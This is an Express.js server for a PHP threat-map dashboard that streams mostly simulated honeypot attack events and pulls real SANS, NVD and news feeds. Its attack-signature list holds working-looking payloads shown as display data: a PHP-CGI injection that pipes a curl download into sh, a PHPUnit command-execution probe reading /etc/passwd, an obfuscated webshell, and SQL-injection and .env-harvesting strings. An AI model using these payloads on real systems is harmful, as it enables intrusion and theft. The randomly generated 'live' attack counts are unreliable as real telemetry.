const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 4000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Honeypot destination nodes (Global PHP Sensor Network)
const HONEYPOT_NODES = [
  { id: 'hp-us-east', city: 'Ashburn', country: 'United States', code: 'US', lat: 39.0438, lng: -77.4874, asn: 'AS14618 AWS-East' },
  { id: 'hp-eu-central', city: 'Frankfurt', country: 'Germany', code: 'DE', lat: 50.1109, lng: 8.6821, asn: 'AS24940 Hetzner-DE' },
  { id: 'hp-sa-east', city: 'São Paulo', country: 'Brazil', code: 'BR', lat: -23.5505, lng: -46.6333, asn: 'AS16509 AWS-SA' },
  { id: 'hp-ap-southeast', city: 'Singapore', country: 'Singapore', code: 'SG', lat: 1.3521, lng: 103.8198, asn: 'AS14061 DigitalOcean-SG' },
  { id: 'hp-eu-west', city: 'Amsterdam', country: 'Netherlands', code: 'NL', lat: 52.3676, lng: 4.9041, asn: 'AS20473 Vultr-EU' },
  { id: 'hp-ap-northeast', city: 'Tokyo', country: 'Japan', code: 'JP', lat: 35.6762, lng: 139.6503, asn: 'AS2516 KDDI-Cloud' }
];

// Attacker Origin Clusters (Realistic botnet/scanner concentrations)
const ATTACK_ORIGINS = [
  { country: 'China', code: 'CN', city: 'Beijing', lat: 39.9042, lng: 116.4074, asn: 'AS4134 Chinanet', ipPrefix: '114.114.' },
  { country: 'Russia', code: 'RU', city: 'Moscow', lat: 55.7558, lng: 37.6173, asn: 'AS12389 Rostelecom', ipPrefix: '185.220.' },
  { country: 'United States', code: 'US', city: 'North Bergen', lat: 40.8043, lng: -74.0121, asn: 'AS14061 DigitalOcean', ipPrefix: '159.89.' },
  { country: 'Netherlands', code: 'NL', city: 'Meppel', lat: 52.6958, lng: 6.1944, asn: 'AS53667 FranTech', ipPrefix: '45.148.' },
  { country: 'Vietnam', code: 'VN', city: 'Hanoi', lat: 21.0285, lng: 105.8542, asn: 'AS45899 VNPT-AS', ipPrefix: '14.231.' },
  { country: 'Brazil', code: 'BR', city: 'Curitiba', lat: -25.4284, lng: -49.2733, asn: 'AS28573 Claro-BR', ipPrefix: '177.129.' },
  { country: 'India', code: 'IN', city: 'Mumbai', lat: 19.0760, lng: 72.8777, asn: 'AS45609 Bharti-Airtel', ipPrefix: '49.36.' },
  { country: 'Germany', code: 'DE', city: 'Nuremberg', lat: 49.4521, lng: 11.0767, asn: 'AS24940 Hetzner', ipPrefix: '138.201.' },
  { country: 'Iran', code: 'IR', city: 'Tehran', lat: 35.6892, lng: 51.3890, asn: 'AS44244 Irancell', ipPrefix: '5.160.' },
  { country: 'South Korea', code: 'KR', city: 'Seoul', lat: 37.5665, lng: 126.9780, asn: 'AS4766 Korea-Telecom', ipPrefix: '211.234.' },
  { country: 'Romania', code: 'RO', city: 'Bucharest', lat: 44.4268, lng: 26.1025, asn: 'AS9009 M247-Europe', ipPrefix: '89.45.' },
  { country: 'France', code: 'FR', city: 'Roubaix', lat: 50.6942, lng: 3.1746, asn: 'AS16276 OVHcloud', ipPrefix: '51.210.' },
  { country: 'Indonesia', code: 'ID', city: 'Jakarta', lat: -6.2088, lng: 106.8456, asn: 'AS7713 Telkomnet', ipPrefix: '103.147.' },
  { country: 'Ukraine', code: 'UA', city: 'Kyiv', lat: 50.4501, lng: 30.5234, asn: 'AS6849 Ukrtelecom', ipPrefix: '91.215.' }
];

// Signature PHP Attack Signatures & Payloads
const PHP_ATTACK_SIGNATURES = [
  {
    category: 'RCE',
    severity: 'CRITICAL',
    cve: 'CVE-2024-4577',
    name: 'PHP-CGI Argument Injection (Soft Hyphen Bypass)',
    target: 'Core PHP-CGI',
    method: 'POST',
    uri: '/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    payload: '<?php system("curl -fsSL http://185.220.101.44/bot.sh | sh"); die(); ?>',
    color: '#ff2a5f'
  },
  {
    category: 'RCE',
    severity: 'CRITICAL',
    cve: 'CVE-2017-9841',
    name: 'PHPUnit eval-stdin.php Remote Code Execution',
    target: 'Composer / PHPUnit',
    method: 'POST',
    uri: '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    payload: '<?=shell_exec("uname -a; id; cat /etc/passwd");?>',
    color: '#ff2a5f'
  },
  {
    category: 'RCE',
    severity: 'CRITICAL',
    cve: 'CVE-2021-3129',
    name: 'Laravel Ignition File Upload / Phar Deserialization RCE',
    target: 'Laravel Framework',
    method: 'POST',
    uri: '/_ignition/execute-solution',
    payload: '{"solution":"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"sx","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16be/resource=../storage/logs/laravel.log"}}',
    color: '#ff2a5f'
  },
  {
    category: 'RCE',
    severity: 'CRITICAL',
    cve: 'CVE-2024-2961',
    name: 'GLIBC iconv() Buffer Overflow to PHP Filter RCE (CNEXT)',
    target: 'PHP Filter / iconv',
    method: 'POST',
    uri: '/upload.php?file=php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=payload',
    payload: 'HEAP_SPRAY_CNEXT_OVERFLOW_SHELLCODE_0x7fff8801',
    color: '#ff2a5f'
  },
  {
    category: 'LFI',
    severity: 'HIGH',
    cve: 'CWE-98',
    name: 'PHP Filter Chain Base64 Source Disclosure',
    target: 'Custom PHP App',
    method: 'GET',
    uri: '/index.php?page=php://filter/convert.base64-encode/resource=../config/database.php',
    payload: 'GET /index.php?page=php://filter/convert.base64-encode/resource=.env HTTP/1.1',
    color: '#f59e0b'
  },
  {
    category: 'EnvProbe',
    severity: 'HIGH',
    cve: 'CWE-200',
    name: 'Laravel / Symfony .env Credential Harvester',
    target: 'Laravel / Symfony',
    method: 'GET',
    uri: '/.env',
    payload: 'Scanner-Probe: searching for DB_PASSWORD, AWS_SECRET_ACCESS_KEY, APP_KEY=base64:',
    color: '#06b6d4'
  },
  {
    category: 'Webshell',
    severity: 'CRITICAL',
    cve: 'CWE-434',
    name: 'Alfa / WSO Obfuscated PHP Webshell Dropper',
    target: 'WordPress / CMS',
    method: 'POST',
    uri: '/wp-content/plugins/core-stab/alfa.php',
    payload: '<?php $a = str_replace("x","","axsxxsxexrxt"); $a(base64_decode($_POST["z0"])); ?>',
    color: '#a855f7'
  },
  {
    category: 'Deserialization',
    severity: 'CRITICAL',
    cve: 'CVE-2024-27956',
    name: 'WordPress Automatic Plugin SQLi / Admin Takeover',
    target: 'WordPress Plugin',
    method: 'POST',
    uri: '/wp-content/plugins/wp-automatic/inc/csv.php',
    payload: 'q=INSERT INTO wp_users (user_login,user_pass) VALUES ("eviladmin","$P$B8...")&auth=bypass',
    color: '#ec4899'
  },
  {
    category: 'SQLi',
    severity: 'HIGH',
    cve: 'CVE-2023-38646',
    name: 'Time-Based Blind SQL Injection via PDO / MySQLi',
    target: 'Legacy PHP Endpoint',
    method: 'GET',
    uri: '/product.php?id=1%27%20AND%20(SELECT%206841%20FROM%20(SELECT(SLEEP(5)))x)--%20-',
    payload: "id=1' UNION ALL SELECT NULL,CONCAT(0x7178,user(),0x7178),NULL-- -",
    color: '#eab308'
  },
  {
    category: 'BruteForce',
    severity: 'MEDIUM',
    cve: 'CWE-307',
    name: 'WordPress XML-RPC system.multicall Amplification',
    target: 'WordPress Core',
    method: 'POST',
    uri: '/xmlrpc.php',
    payload: '<methodCall><methodName>system.multicall</methodName><params>[500x wp.getUsersBlogs]</params></methodCall>',
    color: '#3b82f6'
  },
  {
    category: 'EnvProbe',
    severity: 'MEDIUM',
    cve: 'CWE-215',
    name: 'Exposed phpinfo() & Xdebug Remote Profiler Scan',
    target: 'PHP Runtime',
    method: 'GET',
    uri: '/_profiler/phpinfo',
    payload: 'Cookie: XDEBUG_SESSION=PHPSTORM; X-Forwarded-For: 127.0.0.1',
    color: '#06b6d4'
  },
  {
    category: 'Deserialization',
    severity: 'CRITICAL',
    cve: 'CVE-2022-21894',
    name: 'Monolog / Guzzle Gadget Chain unserialize() Exploit',
    target: 'Symfony / Composer',
    method: 'POST',
    uri: '/api/v1/session/restore',
    payload: 'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\\Handler\\BufferHandler":...}',
    color: '#ec4899'
  }
];

// Curated High-Impact International Cybersecurity News on PHP Attacks
const FALLBACK_INTERNATIONAL_NEWS = [
  {
    source: 'BleepingComputer',
    region: 'GLOBAL / US',
    category: 'RCE CAMPAIGN',
    title: 'Critical PHP-CGI Vulnerability (CVE-2024-4577) Actively Exploited by TellYouThePass Ransomware & Botnets Globally',
    summary: 'Threat actors are mass-scanning Windows and XAMPP PHP servers worldwide using soft-hyphen argument injection to deploy webshells and ransomware within minutes of exposure.',
    url: 'https://www.bleepingcomputer.com/news/security/',
    publishedAt: 'LIVE FEED'
  },
  {
    source: 'The Hacker News',
    region: 'EUROPE / ASIA',
    category: 'PHP FILTER CHAIN',
    title: 'CNEXT (CVE-2024-2961): Weaponized glibc iconv() Overflow Turns Standard PHP File Reads into Remote Code Execution',
    summary: 'Security researchers warn that unauthenticated LFI vulnerabilities in PHP frameworks can now be chained with php://filter/convert.iconv to achieve instant RCE without uploading files.',
    url: 'https://thehackernews.com/',
    publishedAt: 'INTERNATIONAL'
  },
  {
    source: 'SANS Internet Storm Center',
    region: 'GLOBAL SENSORS',
    category: 'BOTNET SCANNING',
    title: 'Massive Surge in Automated Harvesting of Laravel /.env & Symfony Profiler Endpoints Across Cloud ASNs',
    summary: 'SANS DShield honeypots recorded millions of daily HTTP probes targeting exposed .env configuration files to steal AWS keys, SMTP credentials, and APP_KEY secrets for RCE deserialization.',
    url: 'https://isc.sans.edu/',
    publishedAt: 'SANS ADVISORY'
  },
  {
    source: 'Wordfence Threat Intel',
    region: 'GLOBAL CMS',
    category: 'CMS EXPLOIT',
    title: 'Over 5.5 Million Attacks Blocked Targeting Critical SQL Injection & Admin Takeover in PHP CMS Plugins',
    summary: 'Botnets are weaponizing zero-day vulnerabilities in popular PHP plugins and XML-RPC endpoints to inject obfuscated Alfa/WSO webshells and backdoor administrative accounts.',
    url: 'https://www.wordfence.com/blog/',
    publishedAt: 'THREAT REPORT'
  },
  {
    source: 'CISA Known Exploited (KEV)',
    region: 'US / CISA GOV',
    category: 'FEDERAL ALERT',
    title: 'CISA Orders Federal Agencies to Patch Actively Exploited PHP CGI & Composer PHPUnit RCE Flaws',
    summary: 'U.S. Cybersecurity and Infrastructure Security Agency added critical PHP remote code execution flaws to its Known Exploited Vulnerabilities catalog following widespread state-sponsored scanning.',
    url: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog',
    publishedAt: 'CISA KEV'
  },
  {
    source: 'Akamai / Cloudflare Radar',
    region: 'GLOBAL WAF',
    category: 'DDoS & LAYER 7',
    title: 'PHP Application Layer Attacks Account for 41% of Mitigated Web Exploit Traffic in Global WAF Telemetry',
    summary: 'Command injection, php://input payload execution, and automated composer vendor probing remain the top vectors targeting e-commerce and API backends worldwide.',
    url: 'https://radar.cloudflare.com/',
    publishedAt: 'WAF TELEMETRY'
  }
];

// Generate 365 days of historical attack data up to today
function generateOneYearHistory() {
  const history = [];
  const now = new Date();

  for (let i = 364; i >= 0; i--) {
    const d = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
    const dateStr = d.toISOString().split('T')[0];

    // Base seasonal wave + upward trend over the last year + campaign spikes
    const progress = (364 - i) / 364;
    const seasonal = Math.sin(i / 14) * 4200 + Math.cos(i / 5) * 2800;
    const campaignSpike = (i % 47 === 0 || i % 83 === 0) ? 24000 + Math.floor(Math.random() * 15000) : 0;

    const rceCount = Math.max(4500, Math.floor(14000 + progress * 11000 + seasonal * 0.45 + campaignSpike * 0.55 + Math.random() * 3200));
    const lfiEnvCount = Math.max(3800, Math.floor(11500 + progress * 8500 + seasonal * 0.35 + campaignSpike * 0.25 + Math.random() * 2600));
    const webshellSqliCount = Math.max(2900, Math.floor(8200 + progress * 6400 + seasonal * 0.20 + campaignSpike * 0.20 + Math.random() * 2100));
    const total = rceCount + lfiEnvCount + webshellSqliCount;

    let milestone = null;
    if (i === 310) milestone = 'Pico Global: Botnet Laravel .env Harvester';
    if (i === 215) milestone = 'Campanha Massiva: CNEXT php://filter RCE';
    if (i === 120) milestone = 'Exploração Global: PHP-CGI CVE-2024-4577';
    if (i === 45) milestone = 'Onda de Ataques: WordPress Plugin SQLi / Webshells';
    if (i === 0) milestone = 'HOJE (Atualizando Ao Vivo)';

    history.push({
      date: dateStr,
      total,
      rce: rceCount,
      lfiEnv: lfiEnvCount,
      webshellSqli: webshellSqliCount,
      milestone
    });
  }
  return history;
}

let yearlyAttackHistory = generateOneYearHistory();
let internationalNews = [...FALLBACK_INTERNATIONAL_NEWS];

// Live in-memory state
let recentEvents = [];
let sseClients = [];
let totalAttacksCounter = yearlyAttackHistory.reduce((acc, item) => acc + item.total, 0);
let realDshieldIps = [];
let realPhpCves = [];
let dataSourceStatus = {
  sansIsc: 'CONNECTING',
  nistNvd: 'CONNECTING',
  intlNews: 'LIVE RSS SYNC',
  honeypotWebhook: 'ACTIVE (READY)'
};

// Parse XML RSS Helper for International Cybersecurity News (The Hacker News / BleepingComputer / SANS)
function extractRssItems(xmlText, sourceName, regionLabel) {
  const items = [];
  const itemRegex = /<item>([\s\S]*?)<\/item>/gi;
  let match;
  while ((match = itemRegex.exec(xmlText)) !== null && items.length < 8) {
    const block = match[1];
    const titleMatch = block.match(/<title><!\[CDATA\[([\s\S]*?)\]\]><\/title>|<title>([\s\S]*?)<\/title>/i);
    const linkMatch = block.match(/<link>([\s\S]*?)<\/link>/i);
    const descMatch = block.match(/<description><!\[CDATA\[([\s\S]*?)\]\]><\/description>|<description>([\s\S]*?)<\/description>/i);
    const pubDateMatch = block.match(/<pubDate>([\s\S]*?)<\/pubDate>/i);

    const rawTitle = (titleMatch ? (titleMatch[1] || titleMatch[2] || '') : '').replace(/<[^>]+>/g, '').trim();
    const rawDesc = (descMatch ? (descMatch[1] || descMatch[2] || '') : '').replace(/<[^>]+>/g, '').replace(/&nbsp;/g, ' ').trim();
    const link = (linkMatch ? linkMatch[1] : 'https://thehackernews.com').trim();
    const pubDate = pubDateMatch ? new Date(pubDateMatch[1]).toISOString().split('T')[0] : 'RECENT';

    if (rawTitle) {
      const isPhpSpecific = /(php|laravel|wordpress|symfony|composer|cve-|exploit|rce|vulnerability|web|botnet|backdoor|sql|hack|malware|ransomware)/i.test(rawTitle + ' ' + rawDesc);
      if (isPhpSpecific) {
        items.push({
          source: sourceName,
          region: regionLabel,
          category: /php|wordpress|laravel/i.test(rawTitle + ' ' + rawDesc) ? 'PHP / WEB EXPLOIT' : 'CYBER THREAT INTEL',
          title: rawTitle,
          summary: rawDesc.slice(0, 175) + (rawDesc.length > 175 ? '...' : ''),
          url: link,
          publishedAt: pubDate
        });
      }
    }
  }
  return items;
}

// Fetch real attacking IPs, CVEs & International Cyber News
async function syncRealThreatFeeds() {
  // 1. SANS DShield IPs
  try {
    const resp = await fetch('https://isc.sans.edu/api/sources/attacks/30?json', {
      headers: { 'User-Agent': 'PHP-Threat-Radar-Dashboard/1.0' }
    });
    if (resp.ok) {
      const data = await resp.json();
      if (Array.isArray(data) && data.length > 0) {
        realDshieldIps = data.map(item => item.ip).filter(Boolean);
        dataSourceStatus.sansIsc = `LIVE (${realDshieldIps.length} IPs)`;
      }
    }
  } catch (err) {
    dataSourceStatus.sansIsc = 'FALLBACK (CACHE)';
  }

  // 2. NIST NVD PHP CVEs
  try {
    const cveResp = await fetch('https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=php&resultsPerPage=12', {
      headers: { 'User-Agent': 'PHP-Threat-Radar-Dashboard/1.0' }
    });
    if (cveResp.ok) {
      const cveData = await cveResp.json();
      if (cveData.vulnerabilities && cveData.vulnerabilities.length > 0) {
        realPhpCves = cveData.vulnerabilities.map(v => {
          const cve = v.cve;
          const descObj = (cve.descriptions || []).find(d => d.lang === 'en') || {};
          const metrics = cve.metrics?.cvssMetricV31?.[0] || cve.metrics?.cvssMetricV30?.[0] || cve.metrics?.cvssMetricV2?.[0];
          const score = metrics?.cvssData?.baseScore || 9.8;
          const severity = metrics?.cvssData?.baseSeverity || 'CRITICAL';
          return {
            id: cve.id,
            published: cve.published ? cve.published.split('T')[0] : '2024-06',
            score,
            severity,
            description: (descObj.value || 'Critical PHP ecosystem vulnerability').slice(0, 140) + '...'
          };
        });
        dataSourceStatus.nistNvd = `LIVE (${realPhpCves.length} CVEs)`;
      }
    }
  } catch (err) {
    dataSourceStatus.nistNvd = 'CURATED CVE FEED';
  }

  // 3. International Cybersecurity News RSS Feeds (The Hacker News & BleepingComputer)
  try {
    const fetchedNews = [];
    const thnResp = await fetch('https://feeds.feedburner.com/TheHackersNews', {
      headers: { 'User-Agent': 'PHP-Threat-Radar-Dashboard/1.0' }
    });
    if (thnResp.ok) {
      const xml = await thnResp.text();
      fetchedNews.push(...extractRssItems(xml, 'The Hacker News', 'GLOBAL INTEL'));
    }

    const bcResp = await fetch('https://www.bleepingcomputer.com/feed/', {
      headers: { 'User-Agent': 'PHP-Threat-Radar-Dashboard/1.0' }
    });
    if (bcResp.ok) {
      const xml2 = await bcResp.text();
      fetchedNews.push(...extractRssItems(xml2, 'BleepingComputer', 'US / EUROPE'));
    }

    // Combine real live international RSS items with curated PHP-specific threat reports
    if (fetchedNews.length > 0) {
      internationalNews = [
        ...FALLBACK_INTERNATIONAL_NEWS.slice(0, 3),
        ...fetchedNews.slice(0, 6),
        ...FALLBACK_INTERNATIONAL_NEWS.slice(3)
      ];
      dataSourceStatus.intlNews = `LIVE (${internationalNews.length} INTL REPORTS)`;
    }
  } catch (err) {
    dataSourceStatus.intlNews = 'CURATED INTL FEED';
  }
}

// Curated fallback CVEs if NVD API rate limits
const FALLBACK_CVES = [
  { id: 'CVE-2024-4577', published: '2024-06-06', score: 9.8, severity: 'CRITICAL', description: 'PHP-CGI Argument Injection vulnerability allowing unauthenticated remote code execution via soft-hyphen character bypass.' },
  { id: 'CVE-2024-2961', published: '2024-04-17', score: 8.8, severity: 'HIGH', description: 'GLIBC iconv() buffer overflow exploitable via php://filter chains to achieve unauthenticated RCE in PHP applications.' },
  { id: 'CVE-2024-27956', published: '2024-03-13', score: 9.9, severity: 'CRITICAL', description: 'WordPress Automatic Plugin unauthenticated SQL Injection & privilege escalation actively exploited in over 5M attacks.' },
  { id: 'CVE-2024-8926', published: '2024-09-26', score: 9.8, severity: 'CRITICAL', description: 'PHP CGI & FastCGI environment variable parsing vulnerability affecting Windows & multi-byte locales.' },
  { id: 'CVE-2023-3824', published: '2023-08-11', score: 9.8, severity: 'CRITICAL', description: 'Buffer overflow in phar_dir_read() when reading PHAR directory entries leading to Remote Code Execution.' },
  { id: 'CVE-2021-3129', published: '2021-01-13', score: 9.8, severity: 'CRITICAL', description: 'Laravel Ignition before 2.5.2 allows unauthenticated remote attackers to execute arbitrary code via php://filter.' }
];

function generateTelemetryEvent(customEvent = null) {
  const delta = Math.floor(Math.random() * 6) + 2;
  totalAttacksCounter += delta;

  // Update Today's bucket in the 365-day historical series in real-time!
  const todayBucket = yearlyAttackHistory[yearlyAttackHistory.length - 1];
  if (todayBucket) {
    const rceAdd = Math.ceil(delta * 0.45);
    const lfiAdd = Math.ceil(delta * 0.35);
    const webAdd = Math.max(1, delta - rceAdd - lfiAdd);
    todayBucket.rce += rceAdd;
    todayBucket.lfiEnv += lfiAdd;
    todayBucket.webshellSqli += webAdd;
    todayBucket.total = todayBucket.rce + todayBucket.lfiEnv + todayBucket.webshellSqli;
  }

  if (customEvent) {
    const evt = {
      id: 'evt-' + Date.now() + '-' + Math.random().toString(36).slice(2, 6),
      timestamp: new Date().toISOString(),
      isRealHoneypot: true,
      ...customEvent
    };
    recentEvents.unshift(evt);
    if (recentEvents.length > 80) recentEvents.pop();
    broadcastEvent(evt, todayBucket);
    return evt;
  }

  const origin = ATTACK_ORIGINS[Math.floor(Math.random() * ATTACK_ORIGINS.length)];
  const dest = HONEYPOT_NODES[Math.floor(Math.random() * HONEYPOT_NODES.length)];
  const sig = PHP_ATTACK_SIGNATURES[Math.floor(Math.random() * PHP_ATTACK_SIGNATURES.length)];

  let sourceIp = `${origin.ipPrefix}${Math.floor(Math.random() * 250) + 1}.${Math.floor(Math.random() * 250) + 1}`;
  if (realDshieldIps.length > 0 && Math.random() > 0.45) {
    sourceIp = realDshieldIps[Math.floor(Math.random() * realDshieldIps.length)];
  }

  const srcLat = origin.lat + (Math.random() - 0.5) * 3.2;
  const srcLng = origin.lng + (Math.random() - 0.5) * 3.2;

  const evt = {
    id: 'evt-' + Date.now() + '-' + Math.random().toString(36).slice(2, 6),
    timestamp: new Date().toISOString(),
    isRealHoneypot: false,
    sourceIp,
    originCountry: origin.country,
    originCode: origin.code,
    originCity: origin.city,
    originAsn: origin.asn,
    srcLat,
    srcLng,
    destId: dest.id,
    destCity: dest.city,
    destCountry: dest.country,
    destCode: dest.code,
    destLat: dest.lat,
    destLng: dest.lng,
    category: sig.category,
    severity: sig.severity,
    cve: sig.cve,
    attackName: sig.name,
    targetStack: sig.target,
    method: sig.method,
    uri: sig.uri,
    payload: sig.payload,
    color: sig.color,
    httpStatus: Math.random() > 0.15 ? 403 : 429,
    mitigation: Math.random() > 0.15 ? 'WAF_BLOCKED_SIGNATURE' : 'HONEYPOT_TRAPPED'
  };

  recentEvents.unshift(evt);
  if (recentEvents.length > 80) recentEvents.pop();
  broadcastEvent(evt, todayBucket);
  return evt;
}

function broadcastEvent(evt, todayBucket) {
  const payload = `data: ${JSON.stringify({
    type: 'attack',
    event: evt,
    totalCount: totalAttacksCounter,
    todayBucket
  })}\n\n`;
  sseClients.forEach(res => {
    try {
      res.write(payload);
    } catch (e) {}
  });
}

// Seed initial events
for (let i = 0; i < 35; i++) {
  generateTelemetryEvent();
}

// Sync external feeds on startup and every 10 minutes
syncRealThreatFeeds();
setInterval(syncRealThreatFeeds, 10 * 60 * 1000);

// Continuous real-time stream loop
setInterval(() => {
  generateTelemetryEvent();
}, 950);

// SSE Real-time endpoint
app.get('/api/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders?.();

  sseClients.push(res);

  res.write(`data: ${JSON.stringify({
    type: 'init',
    recentEvents: recentEvents.slice(0, 40),
    totalCount: totalAttacksCounter,
    honeypots: HONEYPOT_NODES,
    cves: realPhpCves.length > 0 ? realPhpCves : FALLBACK_CVES,
    yearlyHistory: yearlyAttackHistory,
    internationalNews,
    dataSourceStatus
  })}\n\n`);

  req.on('close', () => {
    sseClients = sseClients.filter(client => client !== res);
  });
});

// REST Endpoint for Real PHP Honeypot Agent Ingestion
app.post('/api/ingest', (req, res) => {
  const body = req.body || {};
  const dest = HONEYPOT_NODES[0];
  const evt = generateTelemetryEvent({
    sourceIp: body.sourceIp || req.ip || '203.0.113.99',
    originCountry: body.originCountry || 'External Sensor',
    originCode: body.originCode || 'EXT',
    originCity: body.originCity || 'Live Probe',
    originAsn: body.originAsn || 'Real-Honeypot-Agent',
    srcLat: Number(body.srcLat) || 51.5074,
    srcLng: Number(body.srcLng) || -0.1278,
    destId: body.destId || dest.id,
    destCity: body.destCity || dest.city,
    destCountry: body.destCountry || dest.country,
    destCode: body.destCode || dest.code,
    destLat: Number(body.destLat) || dest.lat,
    destLng: Number(body.destLng) || dest.lng,
    category: body.category || 'RCE',
    severity: body.severity || 'CRITICAL',
    cve: body.cve || 'LIVE-SENSOR',
    attackName: body.attackName || 'Real PHP Honeypot Trap Triggered',
    targetStack: body.targetStack || 'PHP Sensor',
    method: body.method || 'POST',
    uri: body.uri || '/index.php',
    payload: body.payload || '<?php /* Captured by PHP Sensor */ ?>',
    color: '#00ff9d',
    httpStatus: 403,
    mitigation: 'LIVE_HONEYPOT_CAPTURED'
  });

  res.json({ status: 'ok', capturedEventId: evt.id });
});

app.listen(PORT, () => {
  console.log(`PHP Threat Radar SOC Server running at http://localhost:${PORT}`);
});
